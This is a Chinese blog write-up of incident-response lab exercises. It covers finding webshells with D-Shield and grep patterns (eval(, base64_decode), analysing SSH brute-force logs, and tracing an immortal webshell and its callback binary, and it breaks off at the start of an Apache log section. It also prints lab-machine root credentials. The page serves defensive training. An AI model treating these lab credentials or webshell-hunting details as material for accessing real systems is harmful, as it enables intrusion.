@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="允许一切如其所是">
+    <meta name="author" content="C3ngH">
+    
+    <title>
+        
+            玄机应急响应靶场题解 |
+        
+        C3ngH&#39;s B10g
+    </title><meta name="robots" content="noindex">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"c3ngh.top","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"C3ngH's B10g","author":"C3ngH","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","logo":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","favicon":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"},"menu":{"home":"/","archives":"/archives","links":"/links","设备":"/devices","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"如果有一天你厌倦了，那就回归生活吧","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/real-c3ngh","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":"https://blog-waline-weld.vercel.app/","reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"links":[{"title":"A1natas's Teammates"},{"name":"Lunatic - Misc指路人@星盟安全团队","link":"https://goodlunatic.github.io/","description":"Mind and Hand :)","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Lunatic.png"},{"name":"A1ic3 - Crypto@V&N","link":"https://a1ic3.cn/","description":"希望成为一个有趣的人","avatar":"https://www.a1ic3.cn/avatar.png"},{"name":"PangBai - Reverse@W&M","link":"https://pangbai.work/","description":"世上所有不利都是当事人无能所致","avatar":"http://pangbai.work/images/avatar.jpg"},{"name":"void2eye - Web@WpgSec狼组安全","link":"https://void2eye.fun/","description":"临渊羡鱼，不如退而结网。","avatar":"https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/808.png"},{"name":"carbofish - 全栈@r3kapig / N0wayBack","link":"https://carbo.ink/","description":"ahhhhhhh~","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/CarboFish.jpg"},{"name":"AsaL1n - Web@V&N","link":"https://asal1n.github.io/","description":"why we need that?","avatar":"https://asal1n.github.io/img/head.jpg"},{"name":"enllus1on - Pwn@Nu1L","link":"https://enllus1on.github.io/","description":"pwn for more","avatar":"https://enllus1on.github.io/images/kano.jpg"},{"name":"Straw - Reverse","link":"https://straw-233.github.io/","description":"午门痴","avatar":"https://straw-233.github.io/avatar/meinasi.png"},{"name":"CHHHCHHOH - Web","link":"https://chhhchhoh.cn/","description":"吃了乙酸的乙醇会不会梦到乙酸乙酯？","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/zyc.png"},{"name":"WoodWhale - 全栈@r3kapig","link":"https://woodwhale.cn/","description":"A happy woodwhale!","avatar":"https://www.woodwhale.cn/woodwhale.png"},{"name":"XunFlash - Reverse","link":"https://www.xunflash.top/","description":"你好","avatar":"https://www.xunflash.top/icon.png"},{"name":"huanghunr - Reverse@Nu1L Junior","link":"https://blog.huanghunr.top","description":"喵喵喵?!还没想好","avatar":"https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg"},{"name":"温婳霂 - Misc@V&N","link":"https://somokel.github.io","description":"春祺夏安，秋绥冬宁。","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/wenhuamu.jpg"},{"name":"MetaVi - Misc@N0wayBack","link":"https://metaviii.github.io","description":"Add a touch of fantasy?","avatar":"https://s2.loli.net/2024/12/04/jJpynvQUCA3RlIG.jpg"},{"title":"V&N's Teammates"},{"name":"Aecous","link":"https://aecous.github.io/","description":"web✌","avatar":"https://aecous.github.io/images/me.png"},{"name":"yixinBC","link":"https://blog.buyix.in/","avatar":"https://c.img.dasctf.com/LightPicture/2024/08/c6a64c00f2c066f8.jpg","description":"超级菜浑水摸鱼手"},{"name":"gets","avatar":"https://c.img.dasctf.com/LightPicture/2024/08/ab868415fdfc7ff5.jpg","link":"http://www.getspwn.xyz","description":"好饿啊, 早知道不学pwn了"},{"name":"c_lby","avatar":"https://q.qlogo.cn/headimg_dl?dst_uin=3138622727&spec=640&img_type=jpg","link":"https://c-lby.top/","description":"我们联合, 形成两面包夹芝士！"},{"name":"lianjin","avatar":"https://lianjinlll.cn/images/profilePicture.jpg","link":"https://lianjinlll.cn","description":"hell0_w0r1d"},{"name":"Hurkin","link":"https://www.hurkin.top","avatar":"https://www.hurkin.top/wp-admin/images/hand.jpg","description":"迎着阳光盛大逃亡"},{"name":"yolo","link":"https://www.yo1o.top","avatar":"https://www.yo1o.top/yolo.jpg","description":"还是很菜, 在进修ing"},{"name":"n1gh7ma12e","link":"http://n1gh7ma12e.cn/","avator":"http://n1gh7ma12e.cn/images/avatar.jpg","description":"你所热爱的就是你的生活"},{"title":"Ret2Life"},{"name":"LilRan","link":"https://blog.xinshi.fun/","description":"今日启程 无畏向前","avatar":"https://blog.xinshi.fun/assets/avatar.png"},{"name":"_sun_·empty.","link":"https://sun1028.top/","description":"~Love Forever~","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/sun.jpg"},{"name":"清酒","avatar":"http://clearwine.online/images/qingjiu.jpg","link":"http://clearwine.online/","description":"旅途还在继续，谁也不知道他会在什么时候到达终点。"},{"name":"YanHuoLG","link":"https://www.yanhuolg.com.cn/","avatar":"https://yanhuolg.com.cn/medias/avatar.png","description":"醉后不知天在水，满船清梦压星河。"},{"name":"Aura","link":"https://jasmineaura.github.io/AuraBlog/favicon.ico","avatar":"https://jasmineaura.github.io/AuraBlog/","description":"随便"},{"name":"亮汪汪","link":"https://lwwww.top/","description":"亮汪汪汪汪汪汪汪","avatar":"http://images.lwwww.top/lww.jpg"},{"title":"CTFer"},{"name":"sheep","link":"https://s1nec-1o.github.io/","description":"努力学习的pwner","avatar":"https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"},{"name":"G3rling","avatar":"https://g3rling.top/wp-content/uploads/2024/03/头像.jpg","description":"少说话，多做事","link":"https://g3rling.top/"},{"name":"Mia","avatar":"https://miablog.oss-cn-nanjing.aliyuncs.com/img/Mia.png","link":"https://blog.miamia.top","description":"无论如何，感谢经历。"},{"name":"n0o0b","link":"https://www.n0o0b.com","avator":"https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/n0o0b.png","description":"To be a better noob"},{"title":"战队"},{"name":"A1natas","link":"https://www.a1natas.com/","description":"ZJNU Security Group","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/A1natas.png"},{"name":"V&N","link":"https://vnteam.cn/","description":"V&N Union CTF Team","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VN.png"}]},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               C3ngH&#39;s B10g
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/devices">
+                                
+                                设备
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/devices">
+                            
+                            设备
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        玄机应急响应靶场题解
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">C3ngH</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-02-17 13:40:29</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Wed Jul 09 2025 20:57:14 GMT+0800">2025-07-09 20:57:14</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">学习记录</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Misc/">Misc</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>13 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h3 id="第一章-应急响应-webshell查杀">第一章 应急响应-webshell查杀</h3>
+<blockquote>
+<p>靶机账号密码 root xjwebshell</p>
+<p>1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>
+<p>2.黑客使用的什么工具的shell github地址的md5 flag{md5}</p>
+<p>3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx</p>
+<p>4.黑客免杀马完整路径 md5 flag{md5}</p>
+</blockquote>
+<p>在Windows下使用XShell+XFTP连接目标主机，然后一键下载<code>/var/www/html</code>文件夹到本地。</p>
+<blockquote>
+<p><code>/var/www/html</code>目录一般用于存储网站的HTML文件、图片、脚本等资源，供Web服务器（如Apache或Nginx）提供给访问者。</p>
+</blockquote>
+<p>也可以使用tar命令打包，具体可以参照<a class="link"   target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-tar-gz.html" >Linux tar命令 - 菜鸟教程<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份文件（tar默认只是打包不压缩，参数-z打包后进行gzip压缩，参数-j打包后进行bzip2压缩）</span></span><br><span class="line">tar -cvf test.tar ./test <span class="comment"># 得到test.tar备份文件</span></span><br><span class="line">tar -zcvf test.tar.gz ./test <span class="comment"># 得到test.tar.gz备份文件</span></span><br><span class="line">tar -jcvf test.tar.bz2 ./test <span class="comment"># 得到test.tar.bz2备份文件</span></span><br></pre></td></tr></table></figure>
+<p>解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar –xvf file.tar         <span class="comment"># 解压 tar 包 </span></span><br><span class="line">tar -xzvf file.tar.gz     <span class="comment"># 解压 tar.gz </span></span><br><span class="line">tar -xjvf file.tar.bz2    <span class="comment"># 解压 tar.bz2 </span></span><br><span class="line">tar –xZvf file.tar.Z      <span class="comment"># 解压 tar.Z </span></span><br><span class="line">unrar e file.rar          <span class="comment"># 解压 rar </span></span><br><span class="line">unzip file.zip            <span class="comment"># 解压 zip </span></span><br></pre></td></tr></table></figure>
+<p>下载源代码后使用D盾进行扫描，可以看到四个可疑文件。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225170040568.png"
+                        alt="image-20250225170040568"
+                 ></p>
+<p>可以在gz.php中找到flag1</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225170256230.png"
+                        alt="image-20250225170256230"
+                 ></p>
+<p>google搜索webshell中的key可以看到是哥斯拉</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225170430560.png"
+                        alt="image-20250225170430560"
+                 ></p>
+<p>github搜索得到flag2</p>
+<p>也可以直接使用命令搜索找到可疑的webshell特征</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span></span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.jsp&quot;</span> | xargs grep <span class="string">&quot;exec(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.asp&quot;</span> | xargs grep <span class="string">&quot;execute(&quot;</span> </span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.aspx&quot;</span> | xargs grep <span class="string">&quot;eval(&quot;</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#对于免杀Webshell，可以查看是否使用编码</span></span><br><span class="line">find ./ <span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> | xargs grep <span class="string">&quot;base64_decode&quot;</span> </span><br></pre></td></tr></table></figure>
+<p>根据D盾里的路径<code>/var/www/html/include/Db/.Mysqli.php</code>可以知道隐藏后门，在Linux里可以<code>ls -a</code>看到隐藏文件，得到flag3。</p>
+<p>同理可以找到flag4是top.php。</p>
+<h3 id="第一章-应急响应-Linux日志分析">第一章 应急响应-Linux日志分析</h3>
+<blockquote>
+<p>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,“分割<br>
+2.ssh爆破成功登陆的IP是多少，如果有多个使用”,“分割<br>
+3.爆破用户名字典是什么？如果有多个使用”,&quot;分割<br>
+4.登陆成功的IP共爆破了多少次<br>
+5.黑客登陆主机后新建了一个后门用户，用户名是多少</p>
+</blockquote>
+<p>日志默认存放位置：/var/log/</p>
+<p>查看日志配置情况：more /etc/rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">日志文件</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/var/log/cron</td>
+<td style="text-align:center">记录了系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/cups</td>
+<td style="text-align:center">记录打印信息的日志</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/dmesg</td>
+<td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/mailog</td>
+<td style="text-align:center">记录邮件信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/message</td>
+<td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/btmp</td>
+<td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/lastlog</td>
+<td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/wtmp</td>
+<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/utmp</td>
+<td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/secure</td>
+<td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
+</tr>
+</tbody>
+</table>
+<p>比较重要的几个日志： 登录失败记录：/var/log/btmp //lastb 最后一次登录：/var/log/lastlog //lastlog 登录成功记录: /var/log/wtmp //last 登录日志记录：/var/log/secure</p>
+<p>目前登录用户信息：/var/run/utmp //w、who、users</p>
+<h4 id="Linux日志分析技巧">Linux日志分析技巧</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|<span class="built_in">uniq</span> -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali</span><br><span class="line"><span class="comment">#grep &quot;useradd&quot; /var/log/secure </span></span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span></span><br><span class="line"><span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened <span class="keyword">for</span> user good by root(uid=0)</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span>授权执行:</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">Jul 10 00:43:09 localhost <span class="built_in">sudo</span>:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
+<h3 id="第一章-应急响应-Linux入侵排查">第一章 应急响应-Linux入侵排查</h3>
+<blockquote>
+<p>1.web目录存在木马，请找到木马的密码提交<br>
+2.服务器疑似存在不死马，请找到不死马的密码提交<br>
+3.不死马是通过哪个文件生成的，请提交文件名<br>
+4.黑客留下了木马文件，请找出黑客的服务器ip提交<br>
+5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</p>
+</blockquote>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225190253057.png"
+                        alt="image-20250225190253057"
+                 ></p>
+<p>在Web根目录下使用命令<code>find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</code>可以找到这三个文件，分别为<code>.shell.php、index.php、1.php</code>，1.php应为第一题的木马，可以根据index.php和.shell.php两个文件有相同的md5值猜测是通过index.php实时生成.shell.php。查看源代码也可知如此</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225190842562.png"
+                        alt="image-20250225190842562"
+                 ></p>
+<p>shell内容如下</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225190904450.png"
+                        alt=""
+                 ></p>
+<p>可以看到同目录下有一个elf文件，为Linux可执行二进制文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225191115207.png"
+                        alt="image-20250225191115207"
+                 ></p>
+<p>dump下来后使用微步云沙箱分析，可以看到回连IP和端口</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225191240251.png"
+                        alt="image-20250225191240251"
+                 ></p>
+<h3 id="第二章-日志分析-Apache日志分析">第二章 日志分析-Apache日志分析</h3>
+<blockquote>
+<p>mysql应急响应 ssh账号 root  密码 xjmysql<br>
+ssh <a class="link"   target="_blank" rel="noopener" href="http://env.xj.edisec.net" >env.xj.edisec.net<i class="fas fa-external-link-alt"></i></a>  -p xxxxx<br>
+1.黑客第一次写入的shell flag{关键字符串}<br>
+2.黑客反弹shell的ip flag{ip}<br>
+3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx<br>
+4.黑客获取的权限 flag{whoami后的值}</p>
+</blockquote>
+<p>快速定位到log位置</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250225192013747.png"
+                        alt="image-20250225192013747"
+                 ></p>
